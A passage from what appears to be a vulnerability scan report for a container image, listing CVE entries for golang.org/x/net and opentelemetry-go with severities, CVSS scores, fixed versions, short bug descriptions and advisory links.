│     │      │                   same PATH hijacking attack on BSD and Solaris platforms. This vulnerability is
│     │      │                    fixed in 1.43.0. 
│     │      ├ Severity        : HIGH 
│     │      ├ CweIDs           ─ [0]: CWE-426 
│     │      ├ VendorSeverity   ╭ ghsa  : 3 
│     │      │                  ├ nvd   : 3 
│     │      │                  ├ photon: 3 
│     │      │                  ╰ redhat: 3 
│     │      ├ CVSS             ╭ ghsa   ╭ V40Vector: CVSS:4.0/AV:L/AC:H/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:
│     │      │                  │        │            N/SA:N 
│     │      │                  │        ╰ V40Score : 7.3 
│     │      │                  ├ nvd    ╭ V3Vector: CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H 
│     │      │                  │        ╰ V3Score : 7 
│     │      │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H 
│     │      │                           ╰ V3Score : 8.8 
│     │      ├ References       ╭ [0] : http://github.com/open-telemetry/opentelemetry-go/releases/tag/v1.43.0 
│     │      │                  ├ [1] : https://access.redhat.com/errata/RHSA-2026:26254 
│     │      │                  ├ [2] : https://access.redhat.com/errata/RHSA-2026:26257 
│     │      │                  ├ [3] : https://access.redhat.com/errata/RHSA-2026:37387 
│     │      │                  ├ [4] : https://access.redhat.com/security/cve/CVE-2026-39883 
│     │      │                  ├ [5] : https://bugzilla.redhat.com/show_bug.cgi?id=2456718 
│     │      │                  ├ [6] : https://github.com/open-telemetry/opentelemetry-go 
│     │      │                  ├ [7] : https://github.com/open-telemetry/opentelemetry-go/security/advisories/
│     │      │                  │       GHSA-hfvc-g4fc-pqhx 
│     │      │                  ├ [8] : https://nvd.nist.gov/vuln/detail/CVE-2026-39883 
│     │      │                  ├ [9] : https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-39883
│     │      │                  │       .json 
│     │      │                  ╰ [10]: https://www.cve.org/CVERecord?id=CVE-2026-39883 
│     │      ├ PublishedDate   : 2026-04-08T21:17:00.697Z 
│     │      ╰ LastModifiedDate: 2026-07-24T21:10:00.143Z 
│     ├ [6]  ╭ VulnerabilityID : CVE-2026-25681 
│     │      ├ VendorIDs        ─ [0]: GO-2026-5029 
│     │      ├ PkgID           : golang.org/x/net@v0.51.0 
│     │      ├ PkgName         : golang.org/x/net 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/golang.org/x/net@v0.51.0 
│     │      │                  ╰ UID : 5e89717fe2a26868 
│     │      ├ InstalledVersion: v0.51.0 
│     │      ├ FixedVersion    : 0.55.0 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-25681 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:2538c7c47122fb40dff14a58f1df2b5249c30fc8dffc5da3304017af2aba64aa 
│     │      ├ Title           : golang.org/x/net/html: golang.org/x/net/html: Arbitrary code execution via
│     │      │                   Cross-Site Scripting 
│     │      ├ Description     : Parsing arbitrary HTML which is then rendered using Render can result in an
│     │      │                   unexpected HTML tree. This can be leveraged to execute XSS attacks in
│     │      │                   applications that attempt to sanitize input HTML before rendering. 
│     │      ├ Severity        : HIGH 
│     │      ├ CweIDs           ─ [0]: CWE-1021 
│     │      ├ VendorSeverity   ╭ alma       : 3 
│     │      │                  ├ amazon     : 3 
│     │      │                  ├ azure      : 2 
│     │      │                  ├ oracle-oval: 3 
│     │      │                  ├ redhat     : 3 
│     │      │                  ╰ rocky      : 3 
│     │      ├ CVSS             ─ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N 
│     │      │                           ╰ V3Score : 8.1 
│     │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:37123 
│     │      │                  ├ [1] : https://access.redhat.com/security/cve/CVE-2026-25681 
│     │      │                  ├ [2] : https://bugzilla.redhat.com/2480680 
│     │      │                  ├ [3] : https://bugzilla.redhat.com/2480681 
│     │      │                  ├ [4] : https://bugzilla.redhat.com/2480685 
│     │      │                  ├ [5] : https://bugzilla.redhat.com/2480688 
│     │      │                  ├ [6] : https://bugzilla.redhat.com/2480757 
│     │      │                  ├ [7] : https://bugzilla.redhat.com/2480761 
│     │      │                  ├ [8] : https://bugzilla.redhat.com/2493620 
│     │      │                  ├ [9] : https://bugzilla.redhat.com/show_bug.cgi?id=2480680 
│     │      │                  ├ [10]: https://bugzilla.redhat.com/show_bug.cgi?id=2480681 
│     │      │                  ├ [11]: https://bugzilla.redhat.com/show_bug.cgi?id=2480684 
│     │      │                  ├ [12]: https://bugzilla.redhat.com/show_bug.cgi?id=2480685 
│     │      │                  ├ [13]: https://bugzilla.redhat.com/show_bug.cgi?id=2480688 
│     │      │                  ├ [14]: https://bugzilla.redhat.com/show_bug.cgi?id=2480757 
│     │      │                  ├ [15]: https://bugzilla.redhat.com/show_bug.cgi?id=2480761 
│     │      │                  ├ [16]: https://bugzilla.redhat.com/show_bug.cgi?id=2493620 
│     │      │                  ├ [17]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-25681 
│     │      │                  ├ [18]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-27136 
│     │      │                  ├ [19]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39829 
│     │      │                  ├ [20]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39830 
│     │      │                  ├ [21]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39832 
│     │      │                  ├ [22]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39835 
│     │      │                  ├ [23]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-42508 
│     │      │                  ├ [24]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-57231 
│     │      │                  ├ [25]: https://errata.almalinux.org/9/ALSA-2026-37123.html 
│     │      │                  ├ [26]: https://errata.rockylinux.org/RLSA-2026:37072 
│     │      │                  ├ [27]: https://go.dev/cl/781703 
│     │      │                  ├ [28]: https://go.dev/issue/79574 
│     │      │                  ├ [29]: https://groups.google.com/g/golang-announce/c/iI-mYSI0lu8 
│     │      │                  ├ [30]: https://linux.oracle.com/cve/CVE-2026-25681.html 
│     │      │                  ├ [31]: https://linux.oracle.com/errata/ELSA-2026-37123.html 
│     │      │                  ├ [32]: https://nvd.nist.gov/vuln/detail/CVE-2026-25681 
│     │      │                  ├ [33]: https://pkg.go.dev/vuln/GO-2026-5029 
│     │      │                  ╰ [34]: https://www.cve.org/CVERecord?id=CVE-2026-25681 
│     │      ├ PublishedDate   : 2026-05-22T16:16:19.863Z 
│     │      ╰ LastModifiedDate: 2026-07-23T16:10:00.137Z 
│     ├ [7]  ╭ VulnerabilityID : CVE-2026-27136 
│     │      ├ VendorIDs        ─ [0]: GO-2026-5030 
│     │      ├ PkgID           : golang.org/x/net@v0.51.0 
│     │      ├ PkgName         : golang.org/x/net 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/golang.org/x/net@v0.51.0 
│     │      │                  ╰ UID : 5e89717fe2a26868 
│     │      ├ InstalledVersion: v0.51.0 
│     │      ├ FixedVersion    : 0.55.0 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-27136 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:9de7ad71e2d43f7ef235c57ad9a01324120dcdd3d8ca498cf7691e42952bae6d 
│     │      ├ Title           : golang.org/x/net/html: golang: golang.org/x/net/html: Cross-Site Scripting via
│     │      │                    HTML parsing bypass 
│     │      ├ Description     : Parsing arbitrary HTML which is then rendered using Render can result in an
│     │      │                   unexpected HTML tree. This can be leveraged to execute XSS attacks in
│     │      │                   applications that attempt to sanitize input HTML before rendering. 
│     │      ├ Severity        : HIGH 
│     │      ├ CweIDs           ─ [0]: CWE-1021 
│     │      ├ VendorSeverity   ╭ alma       : 3 
│     │      │                  ├ amazon     : 3 
│     │      │                  ├ azure      : 2 
│     │      │                  ├ oracle-oval: 3 
│     │      │                  ├ redhat     : 3 
│     │      │                  ╰ rocky      : 3 
│     │      ├ CVSS             ─ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N 
│     │      │                           ╰ V3Score : 8.1 
│     │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:37123 
│     │      │                  ├ [1] : https://access.redhat.com/security/cve/CVE-2026-27136 
│     │      │                  ├ [2] : https://bugzilla.redhat.com/2480680 
│     │      │                  ├ [3] : https://bugzilla.redhat.com/2480681 
│     │      │                  ├ [4] : https://bugzilla.redhat.com/2480685 
│     │      │                  ├ [5] : https://bugzilla.redhat.com/2480688 
│     │      │                  ├ [6] : https://bugzilla.redhat.com/2480757 
│     │      │                  ├ [7] : https://bugzilla.redhat.com/2480761 
│     │      │                  ├ [8] : https://bugzilla.redhat.com/2493620 
│     │      │                  ├ [9] : https://bugzilla.redhat.com/show_bug.cgi?id=2480680 
│     │      │                  ├ [10]: https://bugzilla.redhat.com/show_bug.cgi?id=2480681 
│     │      │                  ├ [11]: https://bugzilla.redhat.com/show_bug.cgi?id=2480684 
│     │      │                  ├ [12]: https://bugzilla.redhat.com/show_bug.cgi?id=2480685 
│     │      │                  ├ [13]: https://bugzilla.redhat.com/show_bug.cgi?id=2480688 
│     │      │                  ├ [14]: https://bugzilla.redhat.com/show_bug.cgi?id=2480757 
│     │      │                  ├ [15]: https://bugzilla.redhat.com/show_bug.cgi?id=2480761 
│     │      │                  ├ [16]: https://bugzilla.redhat.com/show_bug.cgi?id=2493620 
│     │      │                  ├ [17]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-25681 
│     │      │                  ├ [18]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-27136 
│     │      │                  ├ [19]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39829 
│     │      │                  ├ [20]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39830 
│     │      │                  ├ [21]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39832 
│     │      │                  ├ [22]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39835 
│     │      │                  ├ [23]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-42508 
│     │      │                  ├ [24]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-57231 
│     │      │                  ├ [25]: https://errata.almalinux.org/9/ALSA-2026-37123.html 
│     │      │                  ├ [26]: https://errata.rockylinux.org/RLSA-2026:37072 
│     │      │                  ├ [27]: https://go.dev/cl/781685 
│     │      │                  ├ [28]: https://go.dev/issue/79575 
│     │      │                  ├ [29]: https://groups.google.com/g/golang-announce/c/iI-mYSI0lu8 
│     │      │                  ├ [30]: https://linux.oracle.com/cve/CVE-2026-27136.html 
│     │      │                  ├ [31]: https://linux.oracle.com/errata/ELSA-2026-37123.html 
│     │      │                  ├ [32]: https://nvd.nist.gov/vuln/detail/CVE-2026-27136 
│     │      │                  ├ [33]: https://pkg.go.dev/vuln/GO-2026-5030 
│     │      │                  ╰ [34]: https://www.cve.org/CVERecord?id=CVE-2026-27136 
│     │      ├ PublishedDate   : 2026-05-22T16:16:20.087Z 
│     │      ╰ LastModifiedDate: 2026-07-23T16:10:00.137Z 
│     ├ [8]  ╭ VulnerabilityID : CVE-2026-33814 
│     │      ├ VendorIDs        ─ [0]: GO-2026-4918 
│     │      ├ PkgID           : golang.org/x/net@v0.51.0 
│     │      ├ PkgName         : golang.org/x/net 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/golang.org/x/net@v0.51.0 
│     │      │                  ╰ UID : 5e89717fe2a26868 
│     │      ├ InstalledVersion: v0.51.0 
│     │      ├ FixedVersion    : 0.53.0 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ SeveritySource  : nvd 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-33814 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:02b7c28f1e3f33f382e21fc16762d6961db9e2120647f7ed187f6915d784e694 
│     │      ├ Title           : net/http/internal/http2: golang: golang.org/x/net: Go HTTP/2: Denial of
│     │      │                   Service via malformed SETTINGS_MAX_FRAME_SIZE frame 
│     │      ├ Description     : When processing HTTP/2 SETTINGS frames, transport will enter an infinite loop
│     │      │                   of writing CONTINUATION frames if it receives a SETTINGS_MAX_FRAME_SIZE with a
│     │      │                    value of 0. 
│     │      ├ Severity        : HIGH 
│     │      ├ CweIDs           ╭ [0]: CWE-835 
│     │      │                  ╰ [1]: CWE-606 
│     │      ├ VendorSeverity   ╭ amazon     : 3 
│     │      │                  ├ azure      : 2 
│     │      │                  ├ bitnami    : 3 
│     │      │                  ├ nvd        : 3 
│     │      │                  ├ oracle-oval: 3 
│     │      │                  ├ photon     : 3 
│     │      │                  ├ redhat     : 3 
│     │      │                  ╰ ubuntu     : 2 
│     │      ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
│     │      │                  │         ╰ V3Score : 7.5 
│     │      │                  ├ nvd     ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
│     │      │                  │         ╰ V3Score : 7.5 
│     │      │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
│     │      │                            ╰ V3Score : 7.5 
│     │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:23262 
│     │      │                  ├ [1] : https://access.redhat.com/errata/RHSA-2026:23264 
│     │      │                  ├ [2] : https://access.redhat.com/errata/RHSA-2026:33120 
│     │      │                  ├ [3] : https://access.redhat.com/errata/RHSA-2026:33123 
│     │      │                  ├ [4] : https://access.redhat.com/errata/RHSA-2026:33142 
│     │      │                  ├ [5] : https://access.redhat.com/errata/RHSA-2026:33150 
│     │      │                  ├ [6] : https://access.redhat.com/errata/RHSA-2026:34342 
│     │      │                  ├ [7] : https://access.redhat.com/errata/RHSA-2026:37387 
│     │      │                  ├ [8] : https://access.redhat.com/errata/RHSA-2026:42644 
│     │      │                  ├ [9] : https://access.redhat.com/errata/RHSA-2026:43692 
│     │      │                  ├ [10]: https://access.redhat.com/security/cve/CVE-2026-33814 
│     │      │                  ├ [11]: https://bugzilla.redhat.com/show_bug.cgi?id=2467815 
│     │      │                  ├ [12]: https://github.com/golang/go/issues/78476 
│     │      │                  ├ [13]: https://go-review.googlesource.com/c/go/+/761581 
│     │      │                  ├ [14]: https://go-review.googlesource.com/c/net/+/761640 
│     │      │                  ├ [15]: https://go.dev/cl/761581 
│     │      │                  ├ [16]: https://go.dev/cl/761640 
│     │      │                  ├ [17]: https://go.dev/issue/78476 
│     │      │                  ├ [18]: https://groups.google.com/g/golang-announce/c/qcCIEXso47M 
│     │      │                  ├ [19]: https://linux.oracle.com/cve/CVE-2026-33814.html 
│     │      │                  ├ [20]: https://linux.oracle.com/errata/ELSA-2026-22121.html 
│     │      │                  ├ [21]: https://nvd.nist.gov/vuln/detail/CVE-2026-33814 
│     │      │                  ├ [22]: https://pkg.go.dev/vuln/GO-2026-4918 
│     │      │                  ├ [23]: https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-33814
│     │      │                  │       .json 
│     │      │                  ├ [24]: https://ubuntu.com/security/notices/USN-8430-1 
│     │      │                  ├ [25]: https://ubuntu.com/security/notices/USN-8471-1 
│     │      │                  ├ [26]: https://ubuntu.com/security/notices/USN-8472-1 
│     │      │                  ├ [27]: https://ubuntu.com/security/notices/USN-8473-1 
│     │      │                  ╰ [28]: https://www.cve.org/CVERecord?id=CVE-2026-33814 
│     │      ├ PublishedDate   : 2026-05-07T20:16:42.88Z 
│     │      ╰ LastModifiedDate: 2026-07-24T13:18:01.21Z 
│     ├ [9]  ╭ VulnerabilityID : CVE-2026-39821 
│     │      ├ VendorIDs        ─ [0]: GO-2026-5026 
│     │      ├ PkgID           : golang.org/x/net@v0.51.0 
│     │      ├ PkgName         : golang.org/x/net 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/golang.org/x/net@v0.51.0 
│     │      │                  ╰ UID : 5e89717fe2a26868 
│     │      ├ InstalledVersion: v0.51.0 
│     │      ├ FixedVersion    : 0.55.0 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-39821 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:201eea860e913af70b6353d95d4f3a8cdc1eda7fdfe4da6c0c1b813d2cd9650c 
│     │      ├ Title           : golang.org/x/net/idna: golang: net/http: golang.org/x/net/idna: Privilege
│     │      │                   escalation via incorrect Punycode label processing 
│     │      ├ Description     : The ToASCII and ToUnicode functions incorrectly accept Punycode-encoded labels
│     │      │                    that decode to an ASCII-only label. For example,
│     │      │                   ToUnicode("xn--example-.com") incorrectly returns the name "example.com"
│     │      │                   rather than an error. This behavior can lead to privilege escalation in
│     │      │                   programs using the idna package. For example, a program which performs
│     │      │                   privilege checks on the ASCII hostname may reject "example.com" but permit
│     │      │                   "xn--example-.com". If that program subsequently converts the ASCII hostname
│     │      │                   to Unicode, it will inadvertently permits access to the Unicode name
│     │      │                   "example.com". 
│     │      ├ Severity        : HIGH 
│     │      ├ CweIDs           ─ [0]: CWE-1289 
│     │      ├ VendorSeverity   ╭ alma       : 3 
│     │      │                  ├ amazon     : 3 
│     │      │                  ├ azure      : 4 
│     │      │                  ├ oracle-oval: 3 
│     │      │                  ├ redhat     : 3 
│     │      │                  ├ rocky      : 3 
│     │      │                  ╰ ubuntu     : 2 
│     │      ├ CVSS             ─ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:N 
│     │      │                           ╰ V3Score : 8.2 
│     │      ├ References       ╭ [0]  : https://access.redhat.com/errata/RHSA-2026:23262 
│     │      │                  ├ [1]  : https://access.redhat.com/errata/RHSA-2026:23264 
│     │      │                  ├ [2]  : https://access.redhat.com/errata/RHSA-2026:26546 
│     │      │                  ├ [3]  : https://access.redhat.com/errata/RHSA-2026:26547 
│     │      │                  ├ [4]  : https://access.redhat.com/errata/RHSA-2026:30650 
│     │      │                  ├ [5]  : https://access.redhat.com/errata/RHSA-2026:30651 
│     │      │                  ├ [6]  : https://access.redhat.com/errata/RHSA-2026:30853 
│     │      │                  ├ [7]  : https://access.redhat.com/errata/RHSA-2026:30854 
│     │      │                  ├ [8]  : https://access.redhat.com/errata/RHSA-2026:30855 
│     │      │                  ├ [9]  : https://access.redhat.com/errata/RHSA-2026:33155 
│     │      │                  ├ [10] : https://access.redhat.com/errata/RHSA-2026:33160 
│     │      │                  ├ [11] : https://access.redhat.com/errata/RHSA-2026:33163 
│     │      │                  ├ [12] : https://access.redhat.com/errata/RHSA-2026:33173 
│     │      │                  ├ [13] : https://access.redhat.com/errata/RHSA-2026:33183 
│     │      │                  ├ [14] : https://access.redhat.com/errata/RHSA-2026:33524 
│     │      │                  ├ [15] : https://access.redhat.com/errata/RHSA-2026:33531 
│     │      │                  ├ [16] : https://access.redhat.com/errata/RHSA-2026:34342 
│     │      │                  ├ [17] : https://access.redhat.com/errata/RHSA-2026:34357 
│     │      │                  ├ [18] : https://access.redhat.com/errata/RHSA-2026:34359 
│     │      │                  ├ [19] : https://access.redhat.com/errata/RHSA-2026:34364 
│     │      │                  ├ [20] : https://access.redhat.com/errata/RHSA-2026:34789 
│     │      │                  ├ [21] : https://access.redhat.com/errata/RHSA-2026:35826 
│     │      │                  ├ [22] : https://access.redhat.com/errata/RHSA-2026:35827 
│     │      │                  ├ [23] : https://access.redhat.com/errata/RHSA-2026:35828 
│     │      │                  ├ [24] : https://access.redhat.com/errata/RHSA-2026:35829 
│     │      │                  ├ [25] : https://access.redhat.com/errata/RHSA-2026:35830 
│     │      │                  ├ [26] : https://access.redhat.com/errata/RHSA-2026:35831 
│     │      │                  ├ [27] : https://access.redhat.com/errata/RHSA-2026:35993 
│     │      │                  ├ [28] : https://access.redhat.com/errata/RHSA-2026:35994 
│     │      │                  ├ [29] : https://access.redhat.com/errata/RHSA-2026:36105 
│     │      │                  ├ [30] : https://access.redhat.com/errata/RHSA-2026:36167 
│     │      │                  ├ [31] : https://access.redhat.com/errata/RHSA-2026:36207 
│     │      │                  ├ [32] : https://access.redhat.com/errata/RHSA-2026:36648 
│     │      │                  ├ [33] : https://access.redhat.com/errata/RHSA-2026:36651 
│     │      │                  ├ [34] : https://access.redhat.com/errata/RHSA-2026:36796 
│     │      │                  ├ [35] : https://access.redhat.com/errata/RHSA-2026:36797 
│     │      │                  ├ [36] : https://access.redhat.com/errata/RHSA-2026:36808 
│     │      │                  ├ [37] : https://access.redhat.com/errata/RHSA-2026:36820 
│     │      │                  ├ [38] : https://access.redhat.com/errata/RHSA-2026:36883 
│     │      │                  ├ [39] : https://access.redhat.com/errata/RHSA-2026:37387 
│     │      │                  ├ [40] : https://access.redhat.com/errata/RHSA-2026:37435 
│     │      │                  ├ [41] : https://access.redhat.com/errata/RHSA-2026:37436 
│     │      │                  ├ [42] : https://access.redhat.com/errata/RHSA-2026:38995 
│     │      │                  ├ [43] : https://access.redhat.com/errata/RHSA-2026:39005 
│     │      │                  ├ [44] : https://access.redhat.com/errata/RHSA-2026:39573 
│     │      │                  ├ [45] : https://access.redhat.com/errata/RHSA-2026:39879 
│     │      │                  ├ [46] : https://access.redhat.com/errata/RHSA-2026:40118 
│     │      │                  ├ [47] : https://access.redhat.com/errata/RHSA-2026:40262 
│     │      │                  ├ [48] : https://access.redhat.com/errata/RHSA-2026:40945 
│     │      │                  ├ [49] : https://access.redhat.com/errata/RHSA-2026:41019 
│     │      │                  ├ [50] : https://access.redhat.com/errata/RHSA-2026:41030 
│     │      │                  ├ [51] : https://access.redhat.com/errata/RHSA-2026:41031 
│     │      │                  ├ [52] : https://access.redhat.com/errata/RHSA-2026:41036 
│     │      │                  ├ [53] : https://access.redhat.com/errata/RHSA-2026:41055 
│     │      │                  ├ [54] : https://access.redhat.com/errata/RHSA-2026:41066 
│     │      │                  ├ [55] : https://access.redhat.com/errata/RHSA-2026:41928 
│     │      │                  ├ [56] : https://access.redhat.com/errata/RHSA-2026:41930 
│     │      │                  ├ [57] : https://access.redhat.com/errata/RHSA-2026:42043 
│     │      │                  ├ [58] : https://access.redhat.com/errata/RHSA-2026:42047 
│     │      │                  ├ [59] : https://access.redhat.com/errata/RHSA-2026:42048 
│     │      │                  ├ [60] : https://access.redhat.com/errata/RHSA-2026:42049 
│     │      │                  ├ [61] : https://access.redhat.com/errata/RHSA-2026:42050 
│     │      │                  ├ [62] : https://access.redhat.com/errata/RHSA-2026:42051 
│     │      │                  ├ [63] : https://access.redhat.com/errata/RHSA-2026:42078 
│     │      │                  ├ [64] : https://access.redhat.com/errata/RHSA-2026:42079 
│     │      │                  ├ [65] : https://access.redhat.com/errata/RHSA-2026:42080 
│     │      │                  ├ [66] : https://access.redhat.com/errata/RHSA-2026:42082 
│     │      │                  ├ [67] : https://access.redhat.com/errata/RHSA-2026:42132 
│     │      │                  ├ [68] : https://access.redhat.com/errata/RHSA-2026:42142 
│     │      │                  ├ [69] : https://access.redhat.com/errata/RHSA-2026:42146 
│     │      │                  ├ [70] : https://access.redhat.com/errata/RHSA-2026:42150 
│     │      │                  ├ [71] : https://access.redhat.com/errata/RHSA-2026:42151 
│     │      │                  ├ [72] : https://access.redhat.com/errata/RHSA-2026:42240 
│     │      │                  ├ [73] : https://access.redhat.com/errata/RHSA-2026:42644 
│     │      │                  ├ [74] : https://access.redhat.com/errata/RHSA-2026:42796 
│     │      │                  ├ [75] : https://access.redhat.com/errata/RHSA-2026:42852 
│     │      │                  ├ [76] : https://access.redhat.com/errata/RHSA-2026:43038 
│     │      │                  ├ [77] : https://access.redhat.com/errata/RHSA-2026:43052 
│     │      │                  ├ [78] : https://access.redhat.com/errata/RHSA-2026:43692 
│     │      │                  ├ [79] : https://access.redhat.com/errata/RHSA-2026:44622 
│     │      │                  ├ [80] : https://access.redhat.com/errata/RHSA-2026:44624 
│     │      │                  ├ [81] : https://access.redhat.com/errata/RHSA-2026:46395 
│     │      │                  ├ [82] : https://access.redhat.com/security/cve/CVE-2026-39821 
│     │      │                  ├ [83] : https://bugzilla.redhat.com/2480756 
│     │      │                  ├ [84] : https://bugzilla.redhat.com/show_bug.cgi?id=2480756 
│     │      │                  ├ [85] : https://bugzilla.redhat.com/show_bug.cgi?id=2484207 
│     │      │                  ├ [86] : https://bugzilla.redhat.com/show_bug.cgi?id=2498152 
│     │      │                  ├ [87] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-27145 
│     │      │                  ├ [88] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39821 
│     │      │                  ├ [89] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39822 
│     │      │                  ├ [90] : https://errata.almalinux.org/9/ALSA-2026-37435.html 
│     │      │                  ├ [91] : https://errata.rockylinux.org/RLSA-2026:38995 
│     │      │                  ├ [92] : https://github.com/golang/go/issues/78760 
│     │      │                  ├ [93] : https://go.dev/cl/767220 
│     │      │                  ├ [94] : https://go.dev/issue/78760 
│     │      │                  ├ [95] : https://groups.google.com/g/golang-announce/c/iI-mYSI0lu8 
│     │      │                  ├ [96] : https://linux.oracle.com/cve/CVE-2026-39821.html 
│     │      │                  ├ [97] : https://linux.oracle.com/errata/ELSA-2026-39573.html 
│     │      │                  ├ [98] : https://nvd.nist.gov/vuln/detail/CVE-2026-39821 
│     │      │                  ├ [99] : https://pkg.go.dev/vuln/GO-2026-5026 
│     │      │                  ├ [100]: https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-3982
│     │      │                  │        1.json 
│     │      │                  ├ [101]: https://ubuntu.com/security/notices/USN-8416-1 
│     │      │                  ╰ [102]: https://www.cve.org/CVERecord?id=CVE-2026-39821 
│     │      ├ PublishedDate   : 2026-05-22T16:16:20.41Z 
│     │      ╰ LastModifiedDate: 2026-07-27T13:17:46.25Z 
│     ├ [10] ╭ VulnerabilityID : CVE-2026-25680 
│     │      ├ VendorIDs        ─ [0]: GO-2026-5028 
│     │      ├ PkgID           : golang.org/x/net@v0.51.0 
│     │      ├ PkgName         : golang.org/x/net 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/golang.org/x/net@v0.51.0 
│     │      │                  ╰ UID : 5e89717fe2a26868 
│     │      ├ InstalledVersion: v0.51.0 
│     │      ├ FixedVersion    : 0.55.0 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-25680 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:e2f0fa222dd9b93a8fb8df34aba5a0fc1a780e85b2d248b4805bda663c1625b9 
│     │      ├ Title           : golang.org/x/net/html: golang.org/x/net/html: Denial of Service due to
│     │      │                   excessive HTML parsing 
│     │      ├ Description     : Parsing arbitrary HTML can consume excessive CPU time, possibly leading to
│     │      │                   denial of service. 
│     │      ├ Severity        : MEDIUM 
│     │      ├ CweIDs           ─ [0]: CWE-400 
│     │      ├ VendorSeverity   ╭ amazon: 3 
│     │      │                  ├ azure : 2 
│     │      │                  ╰ redhat: 2 
│     │      ├ CVSS             ─ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H 
│     │      │                           ╰ V3Score : 6.5 
